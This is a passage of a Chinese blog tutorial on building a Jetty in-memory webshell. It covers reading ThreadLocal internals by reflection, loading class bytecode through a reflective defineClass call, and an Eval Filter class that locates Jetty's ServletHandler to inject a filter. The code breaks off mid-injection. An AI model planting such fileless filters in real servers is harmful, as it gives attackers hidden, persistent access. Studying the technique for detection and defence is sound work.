01 小知识点get ThreadLocal


关于ThreadLocal，我引用下官方的说明，ThreadLocal是一个本地线程副本变量工具类，主要用于将私有线程和该线程存放的副本对象做一个映射，各个线程之间的变量互不干扰。


说白了就是在每个线程都存放一个变量，实现线程之间变量隔离的目的。但我们重点是研究如何存取ThreadLocal中的变量，看下面的demo，如图


这里我们new了一个ThreadLocal变量，存放的是Integer类型的变量，开启debug跟入set方法


可以看到第一步先是获取到当前线程，然后调用getMap方法，如果map不为null，设置当前threadlocal对象为key，18为值。


我们跟入getMap方法，如图


可以看到返回的是一个ThreadLocalMap集合，存放的是ThreadLocalMap$Entry对象，我们看一下


他是ThreadLocalMap的内部类，我们重点关注value字段，它对应的就是我们设置的值，回到 java.lang.ThreadLocal#set 方法，调用map.set，跟入


我们可以看到将table赋值给tab变量，然后遍历执行赋值操作，table是一个 java.lang.ThreadLocal.ThreadLocalMap.Entry 数组，Entry对象中的value就是我们需要获取的字段


到这里我们大致了解了，如果想要通过反射获取ThreadLocal中设置的值，我们需要一下几个步骤

  1. 反射获取 java.lang.Thread#threadLocals 变量，java.lang.Thread#threadLocals 对应的是ThreadLocalMap对象

  2. 通过ThreadLocalMap对象反射获取 table 变量，存储的是 java.lang.ThreadLocal.ThreadLocalMap.Entry 数组

  3. 遍历Entry数组，反射获取 value 变量，获取我们存入的值


好了，有想法就去做，代码如下

import java.lang.reflect.Field;import java.util.Map;
public class Demo1 {
    private static ThreadLocal<Integer> intlocal = new ThreadLocal<>();
    public static void main(String[] args) {        domain();    }
    private static void domain() {        intlocal.set(18);        Thread thread = Thread.currentThread();        try {            Field threadLocals = thread.getClass().getDeclaredField("threadLocals");            threadLocals.setAccessible(true);            Object threadlocalMap = threadLocals.get(thread);            Field table = threadlocalMap.getClass().getDeclaredField("table");            table.setAccessible(true);            Object[] entrys = (Object[]) table.get(threadlocalMap);            for (Object entry : entrys) {                if(entry != null){                    Field value = entry.getClass().getDeclaredField("value");                    value.setAccessible(true);                    Object o = value.get(entry);                    if(o.getClass().getName().equals("java.lang.Integer")){                        System.out.println("yes");                        System.out.println(o);                    }                }            }        } catch (NoSuchFieldException e) {            e.printStackTrace();        } catch (IllegalAccessException e) {            e.printStackTrace();        }    }}


这里我做了个判断，判断获取的类型是否为Integer，是的话才输出变量的值，而且这里会有获取到空的Entry对象的问题，得做个排除判断，不然会报错

使用 javac 进行编译


编译时记得把package删掉，编译之后会生成一个Eval.class文件，这个就是字节码文件，如果我们想在程序中要加载它并执行，应该怎么做呢？


答案就是通过类加载器去做，代码如下

package ScanProject.ClassLoaderStudy;
import sun.misc.BASE64Decoder;import sun.misc.BASE64Encoder;
import java.io.*;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;
public class ReadClass2Base64 {
    public static void main(String[] args) {        domain();    }
    private static void domain() {        try {            ClassLoader loader = Thread.currentThread().getContextClassLoader();            File file = new File("D:\\临时\\Eval.class");            FileInputStream fis = new FileInputStream(file);            ByteArrayOutputStream baos = new ByteArrayOutputStream((int)file.length());            BufferedInputStream bis = new BufferedInputStream(fis);            int size = 1024;            byte[] bytes = new byte[size];            int len = 0;            while((len = bis.read(bytes, 0, size)) != -1){                baos.write(bytes, 0, len);            }            byte[] bytes1 = baos.toByteArray();            Method defineClass = loader.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);            defineClass.setAccessible(true);            Class clazz = (Class) defineClass.invoke(loader, bytes1, 0, bytes1.length);            Object o = clazz.newInstance();            /*String encode = new BASE64Encoder().encode(bytes1);            System.out.println(encode);            byte[] bytes2 = new BASE64Decoder().decodeBuffer(encode);*/        } catch (FileNotFoundException e) {            e.printStackTrace();        } catch (IOException e) {            e.printStackTrace();        } catch (NoSuchMethodException e) {            e.printStackTrace();        } catch (IllegalAccessException e) {            e.printStackTrace();        } catch (InstantiationException e) {            e.printStackTrace();        } catch (InvocationTargetException e) {            e.printStackTrace();        }    }}


这里要讲的一点是，我们通过Thread.currentThread().getContextClassLoader() 获取到的是AppClassLoader，但是AppClassLoader是无法直接获取到我们需要使用使用的defineClass方法的，我们看一下继承关系


可以看到我们需要的是ClassLoader类对象，以此来获取defineClass方法，相当于获取AppClassLoader的 父类->父类->父类，所以我用了三个getSuperclass方法，这点很关键，不然会报没有方法异常


然后就是通过文件读取的方式，将读取的内容存放到ByteArrayOutptuStream对象中，返回byte数组，这是为了方便我们区加载字节码，以及做Base64编码等其他事情，后面会用到。

和上一篇不同的是，这次我们使用一个实现了Filter接口的类来写，这样生成字节码的时候不会有冗余的类文件，因为上一篇我是new了一个Filter类，这样在生成类文件的时候会多出一个Filter类文件，相当于两个类文件，而直接使用继承Filter接口的方式来写，直接new当前对象就相当于创建了一个Filter对象，编译的时候不会多出来其它类文件。


将我们前面获取ServletHandler的思路和编写Jetty内存马的思路融合到一起，代码如下


import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.lang.reflect.Modifier;import java.util.EnumSet;

public class Eval implements Filter {    static {        Thread thread = Thread.currentThread();        try {            Class clazz = Thread.currentThread().getClass();            java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");            field.setAccessible(true);            Object obj = field.get(Thread.currentThread());            field = obj.getClass().getDeclaredField("table");            field.setAccessible(true);            obj = field.get(obj);            Object[] entrys = (Object[]) obj;            for(int i = 0; i < entrys.length; i++){                Object entry = entrys[i];                if(entry == null) continue;                field = entry.getClass().getDeclaredField("value");                field.setAccessible(true);                obj = field.get(entry);                if(obj != null && obj.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")){                    Method getHttpChannel = obj.getClass().getDeclaredMethod("getHttpChannel");                    Object channel = getHttpChannel.invoke(obj);                    // chnall==org.eclipse.jetty.server.HttpChannelOverHttp superclass==org.eclipse.jetty.server.HttpChannel                    Field request = channel.getClass().getSuperclass().getDeclaredField("_request");                    request.setAccessible(true);                    // request_obj == org.eclipse.jetty.server.Request                    Object request_obj = request.get(channel);                    Field scope = request_obj.getClass().getDeclaredField("_scope");                    scope.setAccessible(true);                    Object scope_obj = scope.get(request_obj);                    Method getServletHandler = scope_obj.getClass().getMethod("getServletHandler");                    Object servletHandler = getServletHandler.invoke(scope_obj);

                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();                    clazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");                    field = clazz.getDeclaredField("JAVAX_API");                    field.setAccessible(true);                    Field modifiers = field.getClass().getDeclaredField("modifiers");                    modifiers.setAccessible(true);                    modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);                    Method method = servletHandler.getClass().getMethod("newFilterHolder", clazz);                    Object filterholder = method.invoke(servletHandler, field.get(null));
